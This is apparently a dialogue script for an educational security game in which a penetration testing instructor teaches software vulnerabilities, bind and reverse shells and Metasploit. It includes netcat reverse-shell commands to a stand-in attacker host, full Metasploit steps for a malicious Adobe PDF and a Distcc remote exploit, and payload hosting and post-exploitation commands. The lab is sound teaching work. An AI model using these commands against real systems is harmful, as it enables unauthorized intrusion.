// Vulnerabilities, Exploits, and Remote Access Payloads Lab Sheet
// Based on HacktivityLabSheets: introducing_attacks/3_vulnerabilities.md
// Author: Z. Cliffe Schreuders, Anatoliy Gorbenko, Thalita Vergilio
// License: CC BY-SA 4.0

// Global persistent state
VAR instructor_rapport = 0
VAR exploitation_ethics = 0

// Global variables (synced from scenario.json.erb)
VAR player_name = "Agent 0x00"

=== start ===
~ instructor_rapport = 0
~ exploitation_ethics = 0

Welcome back, {player_name}. What would you like to discuss?

-> vulnerability_hub

// ===========================================
// TIMED INTRO CONVERSATION (Game Start)
// ===========================================

=== intro_timed ===
~ instructor_rapport = 0
~ exploitation_ethics = 0

Welcome to Vulnerabilities and Exploitation, {player_name}. I'm your penetration testing instructor for this session.

This lab explores one of the most critical threats in cybersecurity: software vulnerabilities. Even systems running only "trusted" software from major vendors can be compromised due to programming mistakes.

We'll explore how attackers exploit weaknesses in software systems, the difference between bind shells and reverse shells, and get hands-on with the Metasploit framework.

Let me explain how this lab works. You'll find three key resources here:

First, there's a Lab Sheet Workstation in this room. This gives you access to detailed written instructions and exercises that complement our conversation. Use it to follow along with the material.

Second, in the VM lab room to the north, you'll find terminals to launch virtual machines. You'll work with a Kali Linux attacker machine, a Windows victim system, and a Linux server for hands-on exploitation practice.

Finally, there's a Flag Submission Terminal where you'll submit flags you capture during the exercises. These flags demonstrate that you've successfully completed the challenges.

You can talk to me anytime to explore vulnerability concepts, get tips, or ask questions about the material. I'm here to help guide your learning.

Let me be clear: this knowledge is for authorized security testing, penetration testing engagements, and defensive purposes only. Understanding how attacks work is essential for defending against them.

Ready to get started? Feel free to ask me about any topic, or head to the lab sheet workstation and VM room when you're ready to begin the practical exercises.

~ exploitation_ethics += 10
#influence_increased

-> vulnerability_hub

=== vulnerability_hub ===
What aspect of vulnerabilities and exploitation would you like to explore?

+ [What are software vulnerabilities?]
    -> software_vulnerabilities_intro
+ [What causes software vulnerabilities?]
    -> vulnerability_causes
+ [Exploits and payloads - what's the difference?]
    -> exploits_payloads
+ [Types of payloads and shellcode]
    -> shellcode_intro
+ [Bind shells - how do they work?]
    -> bind_shell_concept
+ [Reverse shells - the modern approach]
    -> reverse_shell_concept
+ [Network Address Translation (NAT) considerations]
    -> nat_considerations
+ [Introduction to Metasploit Framework]
    -> metasploit_intro
+ [Using msfconsole - the interactive console]
    -> msfconsole_basics
+ [Local exploits - attacking client applications]
    -> local_exploits
+ [Remote exploits - attacking network services]
    -> remote_exploits
+ [Show me the commands reference]
    -> commands_reference
+ [Practical challenge tips]
    -> challenge_tips
+ [I'm ready for the lab exercises]
    -> ready_for_practice
+ [That's all for now] #exit_conversation
    See you in the field, Agent.
    -> vulnerability_hub

=== software_vulnerabilities_intro ===
Penetration Testing Instructor: Excellent question. A software vulnerability is a weakness in the security of a program.

~ instructor_rapport += 5

Penetration Testing Instructor: Think about it this way: what if an attacker wants to run malicious code on a system that only allows "trusted" software from companies like Microsoft or Adobe?

Penetration Testing Instructor: Unfortunately, it turns out that writing secure code is quite hard. Innocent and seemingly small programming mistakes can cause serious security vulnerabilities.

Penetration Testing Instructor: In many cases, software vulnerabilities can lead to attackers being able to take control of the vulnerable software. When an attacker can run any code they like, this is known as "arbitrary code execution."

+ [What does arbitrary code execution allow an attacker to do?]
    Penetration Testing Instructor: With arbitrary code execution, attackers can essentially assume the identity of the vulnerable software and misbehave.

    Penetration Testing Instructor: For example, if they compromise a web browser, they can access anything the browser can access - your files, your cookies, your session tokens.

    Penetration Testing Instructor: If they compromise a system service running as administrator or root, they have complete control over the entire system.

    ~ instructor_rapport += 5

+ [Can you give me a real-world example?]
    Penetration Testing Instructor: Sure. Adobe Reader versions before 8.1.2 had vulnerabilities that allowed attackers to craft malicious PDF documents.

    Penetration Testing Instructor: When a victim opened the PDF, the attacker could execute arbitrary code on their system - just by opening what appeared to be a normal document.

    Penetration Testing Instructor: Another example is the Distcc vulnerability (CVE-2004-2687). Anyone who could connect to the Distcc port could execute arbitrary commands on the server.

    ~ instructor_rapport += 5

+ [Tell me more about the causes]
    -> vulnerability_causes

- -> vulnerability_hub

=== vulnerability_causes ===
Penetration Testing Instructor: Software vulnerabilities arise from three main categories of mistakes.

~ instructor_rapport += 5

Penetration Testing Instructor: First, there are design flaws - fundamental mistakes in how the system was architected. These are problems with the concept itself, not just the implementation.

Penetration Testing Instructor: Second, implementation flaws - mistakes in the programming code. This includes buffer overflows, SQL injection vulnerabilities, cross-site scripting flaws, and so on.

Penetration Testing Instructor: Third, misconfiguration - mistakes in settings and configuration. Even secure software can be made vulnerable through poor configuration choices.

+ [Which type is most common?]
    Penetration Testing Instructor: Implementation flaws are incredibly common because programming secure code is difficult, especially in languages like C and C++ that don't have built-in protections.

    Penetration Testing Instructor: However, misconfigurations are also extremely prevalent because systems are complex and it's easy to overlook security settings.

    Penetration Testing Instructor: Design flaws are less common but can be more fundamental and harder to fix without major rearchitecture.

    ~ instructor_rapport += 5

+ [Can these vulnerabilities be completely prevented?]
    Penetration Testing Instructor: That's a great question that gets at a fundamental challenge in security.

    Penetration Testing Instructor: Complete prevention is nearly impossible in complex software. However, we can significantly reduce vulnerabilities through secure coding practices, code review, security testing, and using modern languages with built-in protections.

    Penetration Testing Instructor: This is why defense in depth is important - we assume vulnerabilities will exist and add layers of protection.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== exploits_payloads ===
Penetration Testing Instructor: Let me clarify these two important concepts.

~ instructor_rapport += 5

Penetration Testing Instructor: An exploit is an action - or a piece of software that performs an action - that takes advantage of a vulnerability.

Penetration Testing Instructor: The result is that an attacker makes the system perform in ways that are not intentionally authorized. This could include arbitrary code execution, changes to databases, or denial of service like crashing the system.

Penetration Testing Instructor: The action that takes place when an exploit is successful is known as the payload.

+ [So the exploit is the delivery mechanism?]
    Penetration Testing Instructor: Exactly! Think of it like this: the exploit is the lock pick, and the payload is what you do once you're inside.

    Penetration Testing Instructor: The exploit leverages the vulnerability to gain control, and the payload is the malicious code that runs once control is achieved.

    Penetration Testing Instructor: In Metasploit, you can mix and match exploits with different payloads, giving tremendous flexibility.

    ~ instructor_rapport += 5

+ [What kinds of payloads are there?]
    -> shellcode_intro

- -> vulnerability_hub

=== shellcode_intro ===
Penetration Testing Instructor: The most common type of payload is shellcode - code that gives the attacker shell access to the target system.

~ instructor_rapport += 5

Penetration Testing Instructor: With shell access, attackers can interact with a command prompt and run commands on the target system as if they were sitting at the keyboard.

Penetration Testing Instructor: Metasploit has hundreds of different payloads. You can list them with the msfvenom command:

Penetration Testing Instructor: msfvenom -l payload pipe to less

Penetration Testing Instructor: There are two main approaches to achieving remote shell access: bind shells and reverse shells.

+ [What's a bind shell?]
    -> bind_shell_concept

+ [What's a reverse shell?]
    -> reverse_shell_concept

+ [Which one should I use?]
    Penetration Testing Instructor: In modern penetration testing, reverse shells are almost always the better choice.

    Penetration Testing Instructor: They bypass most firewall configurations and work even when the target is behind NAT.

    Penetration Testing Instructor: But let me explain both so you understand the trade-offs.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== bind_shell_concept ===
Penetration Testing Instructor: A bind shell is the simplest approach. The payload listens on the network for a connection, and serves up a shell to anything that connects.

~ instructor_rapport += 5

Penetration Testing Instructor: Think of it like this: the victim's computer opens a port and waits. The attacker then connects to that port and gets a command prompt.

Penetration Testing Instructor: You can simulate this with netcat. On the victim system, run:

Penetration Testing Instructor: nc.exe -l -p 31337 -e cmd.exe -vv

Penetration Testing Instructor: Then from the attacker system, connect with:

Penetration Testing Instructor: nc VICTIM_IP 31337

+ [What do those netcat flags mean?]
    Penetration Testing Instructor: Good attention to detail! Let me break it down:

    Penetration Testing Instructor: The -l flag tells netcat to listen as a service rather than connect as a client.

    Penetration Testing Instructor: The -p flag specifies the port number to listen on.

    Penetration Testing Instructor: The -e flag executes the specified program (cmd.exe on Windows, /bin/bash on Linux) and pipes all interaction through the connection.

    Penetration Testing Instructor: The -vv flag makes it very verbose, showing you what's happening.

    ~ instructor_rapport += 5

+ [What's the main limitation of bind shells?]
    Penetration Testing Instructor: Excellent question. Firewalls and NAT routing are the main problems.

    Penetration Testing Instructor: Nowadays, firewalls typically prevent incoming network connections unless there's a specific reason to allow them - like the system being a web server.

    Penetration Testing Instructor: If the victim is behind a NAT router or firewall that blocks incoming connections, your bind shell is useless.

    Penetration Testing Instructor: This is why reverse shells became the dominant approach.

    ~ instructor_rapport += 5

+ [Tell me about reverse shells instead]
    -> reverse_shell_concept

- -> vulnerability_hub

=== reverse_shell_concept ===
Penetration Testing Instructor: Reverse shells solve the firewall and NAT problems by reversing the connection direction.

~ instructor_rapport += 5

Penetration Testing Instructor: Instead of the attacker connecting to the victim, the victim connects to the attacker!

Penetration Testing Instructor: Here's how it works: the attacker starts listening on their system, then the payload on the victim's system initiates an outbound connection to the attacker.

Penetration Testing Instructor: This works because firewalls typically allow outbound connections. They have to - otherwise you couldn't browse websites or check email.

+ [How do you set up a reverse shell with netcat?]
    Penetration Testing Instructor: On the attacker system (Kali), start listening:

    Penetration Testing Instructor: nc -l -p 53 -vv

    Penetration Testing Instructor: On the victim system, connect back:

    Penetration Testing Instructor: nc.exe ATTACKER_IP 53 -e cmd.exe -vv

    Penetration Testing Instructor: Notice the victim is making the connection, but you still get a shell on your attacker system.

    ~ instructor_rapport += 5

+ [Why use port 53 specifically?]
    Penetration Testing Instructor: Brilliant observation! Port 53 is used by DNS - the Domain Name System that resolves domain names to IP addresses.

    Penetration Testing Instructor: Almost every Internet-connected system needs DNS to function. It's how "google.com" becomes an IP address.

    Penetration Testing Instructor: Because DNS is essential, it's extremely rare for firewalls to block outbound connections on port 53.

    Penetration Testing Instructor: By using port 53, we're disguising our reverse shell connection as DNS traffic, making it very likely to get through.

    ~ instructor_rapport += 5

+ [What about NAT and public IP addresses?]
    -> nat_considerations

- -> vulnerability_hub

=== nat_considerations ===
Penetration Testing Instructor: Network Address Translation adds another complication worth understanding.

~ instructor_rapport += 5

Penetration Testing Instructor: Often computer systems share one public IP address via a router, which then sends traffic to the correct local IP address using NAT.

Penetration Testing Instructor: Unless port forwarding is configured on the router, there's no way to connect directly to a system without a public IP address.

Penetration Testing Instructor: This is another reason reverse shells are necessary - they can start connections from behind NAT to systems with public IPs.

+ [So the attacker needs a public IP?]
    Penetration Testing Instructor: For a reverse shell to work, yes - the attacker needs a publicly routable IP address, or port forwarding from one.

    Penetration Testing Instructor: This is why attackers often use VPS (Virtual Private Servers) or compromised servers as command and control infrastructure.

    Penetration Testing Instructor: In penetration testing engagements, you might work with the client's network team to set up proper port forwarding.

    ~ instructor_rapport += 5

+ [What if both systems are behind NAT?]
    Penetration Testing Instructor: Then you'd need more advanced techniques like tunneling through a public server, or exploiting Universal Plug and Play (UPnP) to create port forwards.

    Penetration Testing Instructor: Some attack frameworks use domain generation algorithms or communicate through third-party services like social media APIs.

    Penetration Testing Instructor: But that's getting into advanced command and control techniques beyond this basic lab.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== metasploit_intro ===
Penetration Testing Instructor: The Metasploit Framework is one of the most powerful and comprehensive tools for exploitation and penetration testing.

~ instructor_rapport += 5

Penetration Testing Instructor: At its core, Metasploit provides a framework - a set of libraries and tools for exploit development and deployment.

Penetration Testing Instructor: It includes modules for specific exploits, payloads, encoders, post-exploitation tools, and other extensions.

Penetration Testing Instructor: The framework has several interfaces you can use: msfconsole (the interactive text console), the web-based Metasploit Community/Pro editions, and Armitage (a graphical interface).

+ [How many exploits does it include?]
    Penetration Testing Instructor: Depending on the version and when it was last updated, Metasploit typically includes over two thousand different exploits!

    Penetration Testing Instructor: When you start msfconsole, it reports the exact number of exploit modules available.

    Penetration Testing Instructor: You can see them all with the "show exploits" command, though that list is quite long.

    ~ instructor_rapport += 5

+ [What's the typical workflow for using an exploit?]
    Penetration Testing Instructor: Great question. Here's the standard process:

    Penetration Testing Instructor: First, specify the exploit to use. Second, set options for the exploit like the IP address to attack. Third, choose a payload - this defines what happens on the compromised system.

    Penetration Testing Instructor: Optionally, you can choose encoding to evade security monitoring like anti-malware or intrusion detection systems.

    Penetration Testing Instructor: Finally, launch the exploit and see if it succeeds.

    Penetration Testing Instructor: The flexibility to combine any exploit with different payloads and encoding is what makes Metasploit so powerful.

    ~ instructor_rapport += 5

+ [Tell me more about msfconsole]
    -> msfconsole_basics

- -> vulnerability_hub

=== msfconsole_basics ===
Penetration Testing Instructor: Msfconsole is the interactive console interface that many consider the preferred way to use Metasploit.

~ instructor_rapport += 5

Penetration Testing Instructor: Start it by simply running "msfconsole" - though it may take a moment to load.

Penetration Testing Instructor: Once it's running, you have access to all of Metasploit's features through an interactive command line.

+ [What commands should I know?]
    Penetration Testing Instructor: Let me give you the essentials:

    Penetration Testing Instructor: "help" shows all available commands. "show exploits" lists all exploit modules. "show payloads" lists available payloads.

    Penetration Testing Instructor: "use exploit/path/to/exploit" selects an exploit. "show options" displays what needs to be configured.

    Penetration Testing Instructor: "set OPTION_NAME value" configures an option. "exploit" or "run" launches the attack.

    Penetration Testing Instructor: "back" returns you to the main context if you want to change exploits.

    ~ instructor_rapport += 5

+ [Can I run regular shell commands too?]
    Penetration Testing Instructor: Yes! You can run local programs directly from msfconsole, similar to a standard shell.

    Penetration Testing Instructor: For example, "ls /home/kali" works just fine from within msfconsole.

    Penetration Testing Instructor: This is convenient because you don't need to exit msfconsole to check files or run quick commands.

    ~ instructor_rapport += 5

+ [Does it have tab completion?]
    Penetration Testing Instructor: Absolutely! Msfconsole has excellent tab completion support.

    Penetration Testing Instructor: You can press TAB while typing exploit paths, options, or commands to autocomplete them.

    Penetration Testing Instructor: You can also use UP and DOWN arrow keys to navigate through your command history.

    Penetration Testing Instructor: These features make it much faster to work with Metasploit.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== local_exploits ===
Penetration Testing Instructor: Local exploits target applications running on the victim's computer, rather than network services.

~ instructor_rapport += 5

Penetration Testing Instructor: These often require some social engineering to get the victim to open a malicious file or visit a malicious website.

Penetration Testing Instructor: A classic example is the Adobe PDF Escape EXE vulnerability (CVE-2010-1240). This affected Adobe Reader versions before 8.1.2.

+ [How does the PDF exploit work?]
    Penetration Testing Instructor: You craft a malicious PDF document that exploits a vulnerability in how Adobe Reader processes embedded executables.

    Penetration Testing Instructor: When the victim opens the PDF, they're prompted to execute a payload with a message that encourages them to click "Open."

    Penetration Testing Instructor: If they click it, your payload executes on their system with their privileges.

    Penetration Testing Instructor: The Metasploit module is "exploit/windows/fileformat/adobe_pdf_embedded_exe"

    ~ instructor_rapport += 5

+ [Walk me through creating a malicious PDF]
    Penetration Testing Instructor: Sure! In msfconsole, start with:

    Penetration Testing Instructor: use exploit/windows/fileformat/adobe_pdf_embedded_exe

    Penetration Testing Instructor: Then set the filename: set FILENAME timetable.pdf

    Penetration Testing Instructor: Choose a payload: set PAYLOAD windows/shell/reverse_tcp

    Penetration Testing Instructor: Configure where to connect back: set LHOST YOUR_IP and set LPORT YOUR_PORT

    Penetration Testing Instructor: Finally, run the exploit to generate the malicious PDF.

    Penetration Testing Instructor: To receive the reverse shell, you need to set up a handler before the victim opens the PDF.

    ~ instructor_rapport += 5

+ [How do I set up the handler to receive the connection?]
    Penetration Testing Instructor: Good question! You use the multi/handler exploit:

    Penetration Testing Instructor: use exploit/multi/handler

    Penetration Testing Instructor: set payload windows/meterpreter/reverse_tcp

    Penetration Testing Instructor: set LHOST YOUR_IP

    Penetration Testing Instructor: set LPORT YOUR_PORT (must match what you used in the PDF)

    Penetration Testing Instructor: Then run it and leave it listening. When the victim opens the PDF and clicks through, you'll get a shell!

    ~ instructor_rapport += 5

+ [How would I deliver this PDF to a victim?]
    Penetration Testing Instructor: In a real penetration test, you might host it on a web server and send a phishing email with a link.

    Penetration Testing Instructor: For the lab, you can start Apache web server and host the PDF there.

    Penetration Testing Instructor: Create a share directory: sudo mkdir /var/www/html/share

    Penetration Testing Instructor: Copy your PDF there: sudo cp /home/kali/.msf4/local/timetable.pdf /var/www/html/share/

    Penetration Testing Instructor: Start Apache: sudo service apache2 start

    Penetration Testing Instructor: Then the victim can browse to http://YOUR_IP/share/timetable.pdf

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== remote_exploits ===
Penetration Testing Instructor: Remote exploits are even more dangerous because they target network services directly exposed to the Internet.

~ instructor_rapport += 5

Penetration Testing Instructor: No social engineering required - if the vulnerable service is accessible, you can often compromise it without any user interaction!

Penetration Testing Instructor: A great example is the Distcc vulnerability (CVE-2004-2687). Distcc is a program to distribute compilation of C/C++ code across systems on a network.

+ [What makes Distcc vulnerable?]
    Penetration Testing Instructor: Distcc has a documented security issue where anyone who can connect to the port can execute arbitrary commands as the distcc user.

    Penetration Testing Instructor: There's no authentication, no authorization checks. If you can reach the port, you can run commands. It's that simple.

    Penetration Testing Instructor: This is a design flaw - the software was built for trusted networks and doesn't include any security controls.

    ~ instructor_rapport += 5

+ [How do I exploit Distcc with Metasploit?]
    Penetration Testing Instructor: The exploit module is exploit/unix/misc/distcc_exec. Let me walk you through it:

    Penetration Testing Instructor: First, use the exploit: use exploit/unix/misc/distcc_exec

    Penetration Testing Instructor: Set the target: set RHOST VICTIM_IP

    Penetration Testing Instructor: Choose a payload: set PAYLOAD cmd/unix/reverse

    Penetration Testing Instructor: Configure your listener: set LHOST YOUR_IP and set LPORT YOUR_PORT

    Penetration Testing Instructor: Then launch: exploit

    Penetration Testing Instructor: Unlike the PDF exploit, msfconsole automatically starts the reverse shell handler for remote exploits!

    ~ instructor_rapport += 5

+ [Can I check if a target is vulnerable first?]
    Penetration Testing Instructor: Great thinking! Some Metasploit exploits support a "check" command.

    Penetration Testing Instructor: After setting your options, run "check" to see if the target appears vulnerable.

    Penetration Testing Instructor: Not all exploits support this, and it's not 100% reliable, but it's worth trying.

    Penetration Testing Instructor: For Distcc specifically, the check function isn't supported, but trying it doesn't hurt.

    ~ instructor_rapport += 5

+ [What level of access do I get?]
    Penetration Testing Instructor: With Distcc, you typically get user-level access as the "distccd" user.

    Penetration Testing Instructor: You won't have root (administrator) access initially, but you can access anything that user can access.

    Penetration Testing Instructor: From there, you might attempt privilege escalation to gain root access, which is often the ultimate goal on Unix systems.

    Penetration Testing Instructor: Even without root, a compromised user account can cause significant damage.

    ~ instructor_rapport += 5

+ [How can I make the shell more usable?]
    Penetration Testing Instructor: The initial shell from cmd/unix/reverse is quite basic. You can upgrade it to an interactive shell:

    Penetration Testing Instructor: Run: python -c 'import pty; pty.spawn("/bin/bash")'

    Penetration Testing Instructor: This spawns a proper bash shell with better command line editing and behavior.

    Penetration Testing Instructor: Then you'll have a more normal feeling shell prompt to work with.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== commands_reference ===
Penetration Testing Instructor: Let me give you a comprehensive commands reference for this lab.

~ instructor_rapport += 5

Penetration Testing Instructor: Listing Metasploit Payloads:

Penetration Testing Instructor: msfvenom -l payload pipe to less

Penetration Testing Instructor: Bind Shell Simulation with Netcat:

Penetration Testing Instructor: On victim: nc.exe -l -p 31337 -e cmd.exe -vv

Penetration Testing Instructor: On attacker: nc VICTIM_IP 31337

+ [Show me reverse shell commands]
    Penetration Testing Instructor: **Reverse Shell with Netcat:**

    Penetration Testing Instructor: On attacker: nc -l -p 53 -vv

    Penetration Testing Instructor: On victim: nc.exe ATTACKER_IP 53 -e cmd.exe -vv

    ~ instructor_rapport += 3

+ [Show me msfconsole basics]
    Penetration Testing Instructor: **Msfconsole Basics:**

    Penetration Testing Instructor: Start console: msfconsole

    Penetration Testing Instructor: Get help: help

    Penetration Testing Instructor: List exploits: show exploits

    Penetration Testing Instructor: List payloads: show payloads

    Penetration Testing Instructor: Get exploit info: info exploit/path/to/exploit

    Penetration Testing Instructor: Select exploit: use exploit/path/to/exploit

    Penetration Testing Instructor: Show options: show options

    Penetration Testing Instructor: Set option: set OPTION_NAME value

    Penetration Testing Instructor: Go back: back

    Penetration Testing Instructor: Run exploit: exploit or run

    ~ instructor_rapport += 3

+ [Show me the Adobe PDF exploit commands]
    Penetration Testing Instructor: **Adobe PDF Exploit (CVE-2010-1240):**

    Penetration Testing Instructor: use exploit/windows/fileformat/adobe_pdf_embedded_exe

    Penetration Testing Instructor: set FILENAME timetable.pdf

    Penetration Testing Instructor: set PAYLOAD windows/shell/reverse_tcp

    Penetration Testing Instructor: set LHOST YOUR_KALI_IP

    Penetration Testing Instructor: set LPORT 4444

    Penetration Testing Instructor: run

    Penetration Testing Instructor: **Set up handler:**

    Penetration Testing Instructor: use exploit/multi/handler

    Penetration Testing Instructor: set payload windows/meterpreter/reverse_tcp

    Penetration Testing Instructor: set LHOST YOUR_KALI_IP

    Penetration Testing Instructor: set LPORT 4444

    Penetration Testing Instructor: run

    ~ instructor_rapport += 3

+ [Show me the Distcc exploit commands]
    Penetration Testing Instructor: **Distcc Remote Exploit (CVE-2004-2687):**

    Penetration Testing Instructor: use exploit/unix/misc/distcc_exec

    Penetration Testing Instructor: set RHOST VICTIM_IP

    Penetration Testing Instructor: set PAYLOAD cmd/unix/reverse

    Penetration Testing Instructor: set LHOST YOUR_KALI_IP

    Penetration Testing Instructor: set LPORT 4444

    Penetration Testing Instructor: check (to see if target is vulnerable)

    Penetration Testing Instructor: exploit

    Penetration Testing Instructor: **Upgrade to interactive shell:**

    Penetration Testing Instructor: python -c 'import pty; pty.spawn("/bin/bash")'

    ~ instructor_rapport += 3

+ [Show me web server setup for hosting payloads]
    Penetration Testing Instructor: **Web Server Setup:**

    Penetration Testing Instructor: Create share directory: sudo mkdir /var/www/html/share

    Penetration Testing Instructor: Copy payload: sudo cp /home/kali/.msf4/local/filename.pdf /var/www/html/share/

    Penetration Testing Instructor: Start Apache: sudo service apache2 start

    Penetration Testing Instructor: Access from victim: http://KALI_IP/share/filename.pdf

    ~ instructor_rapport += 3

+ [Show me useful post-exploitation commands]
    Penetration Testing Instructor: **Post-Exploitation Commands:**

    Penetration Testing Instructor: Windows: whoami, dir, net user, ipconfig, systeminfo

    Penetration Testing Instructor: Linux: whoami, ls -la, uname -a, ifconfig, cat /etc/passwd

    Penetration Testing Instructor: Navigate: cd DIRECTORY

    Penetration Testing Instructor: Create file: echo TEXT > filename.txt

    Penetration Testing Instructor: Open browser (Windows): explorer "https://example.com"

    ~ instructor_rapport += 3

+ [Show me how to find network IPs]
    Penetration Testing Instructor: **Finding IP Addresses:**

    Penetration Testing Instructor: On Kali: ifconfig or hostname -I

    Penetration Testing Instructor: On Windows: ipconfig

    Penetration Testing Instructor: Note the host-only network interfaces that start with the same 3 octets.

    ~ instructor_rapport += 3

- -> vulnerability_hub

=== challenge_tips ===
Penetration Testing Instructor: Let me give you some practical tips for succeeding in the challenge.

~ instructor_rapport += 5

Penetration Testing Instructor: **For the Adobe PDF exploit:**

Penetration Testing Instructor: Make sure you set up the handler BEFORE the victim opens the PDF. The reverse shell will try to connect immediately.

Penetration Testing Instructor: The LHOST and LPORT must match between the PDF generation and the handler.

Penetration Testing Instructor: On Windows, use Adobe Reader specifically, not Chrome's built-in PDF viewer, since we're exploiting Adobe Reader's vulnerability.

+ [What if the PDF exploit doesn't work?]
    Penetration Testing Instructor: First, check that Windows firewall isn't blocking the connection. Usually it won't block outbound connections, but double-check.

    Penetration Testing Instructor: Verify your IP addresses are correct - use the host-only network addresses that start with the same three octets.

    Penetration Testing Instructor: Make sure your handler is actually running when the victim opens the PDF.

    Penetration Testing Instructor: Check that you're opening with Adobe Reader, not another PDF viewer.

    ~ instructor_rapport += 5

+ [Tips for the Distcc exploit?]
    Penetration Testing Instructor: The Linux victim VM is the server running Distcc. You can't open it directly - that's expected.

    Penetration Testing Instructor: The IP address typically ends in .3 and starts with the same three octets as your Kali and Windows VMs.

    Penetration Testing Instructor: After you get shell access, remember you can upgrade to an interactive shell with that Python one-liner.

    Penetration Testing Instructor: Look in the distccd user's home directory for the flag file.

    ~ instructor_rapport += 5

+ [General troubleshooting advice?]
    Penetration Testing Instructor: Always double-check your IP addresses. Getting the wrong IP is the most common mistake.

    Penetration Testing Instructor: Pay attention to whether you need LHOST (local host - your Kali IP) or RHOST (remote host - victim IP).

    Penetration Testing Instructor: If something doesn't work, run "show options" again to verify all settings before running the exploit.

    Penetration Testing Instructor: Use ifconfig to check your Kali IP and ipconfig to check Windows IP.

    ~ instructor_rapport += 5

+ [What should I do once I have shell access?]
    Penetration Testing Instructor: First, verify you have access by running basic commands like "whoami" and "dir" or "ls".

    Penetration Testing Instructor: Navigate to the user's home directory and look for flag files.

    Penetration Testing Instructor: For the PDF exploit, the flag might be on the Desktop or in the user's home folder.

    Penetration Testing Instructor: For Distcc, look in /home for user directories, then search for flag files.

    Penetration Testing Instructor: Read the flag with "cat flag" or "type flag" on Windows.

    ~ instructor_rapport += 5

- -> vulnerability_hub

=== ready_for_practice ===
Penetration Testing Instructor: Excellent! You're ready to start the practical exercises.

~ instructor_rapport += 10
~ exploitation_ethics += 10

Penetration Testing Instructor: Remember: the knowledge you've gained about vulnerabilities and exploitation is powerful. Use it only for authorized security testing, penetration testing engagements, and defensive purposes.

Penetration Testing Instructor: Understanding how attacks work makes you a better defender. But wielding these tools without authorization is both illegal and unethical.

Penetration Testing Instructor: In the lab environment, you'll practice both local exploits (the Adobe PDF vulnerability) and remote exploits (the Distcc vulnerability).

+ [Any final advice before I start?]
    Penetration Testing Instructor: Take your time and read the error messages carefully. Metasploit is verbose and will tell you what went wrong.

    Penetration Testing Instructor: Use tab completion and command history to work more efficiently.

    Penetration Testing Instructor: Document what you're doing as you go - it helps with troubleshooting and writing reports later.

    Penetration Testing Instructor: Most importantly: if you get stuck, check "show options" to verify your settings, and make sure your IP addresses are correct.

    Penetration Testing Instructor: Good luck, Agent {player_name}. This is where theory meets practice.

    ~ instructor_rapport += 10

- -> vulnerability_hub

-> vulnerability_hub
